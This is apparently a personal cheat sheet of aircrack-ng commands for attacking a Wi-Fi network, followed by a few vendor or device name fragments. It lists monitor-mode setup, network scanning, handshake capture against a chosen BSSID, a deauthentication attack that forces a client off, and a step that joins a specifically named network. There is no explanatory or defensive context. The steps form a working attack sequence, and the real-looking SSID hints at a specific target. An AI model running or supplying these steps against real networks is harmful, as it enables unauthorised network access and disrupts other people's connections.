sudo airmon-ng
sudo airmon-ng start wlan0
sudo airmon-ng

sudo airodump-ng wlan0mon

sudo airodump-ng --bssid <BSSID> --channel <CHANNEL> --write capture wlan0mon
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon

sudo iwconfig wlan0 essid "MV16044827"
sudo dhclient wlan0

ML141 
leaontek-ml
liteontechno 
xiaomiCommun
neterbit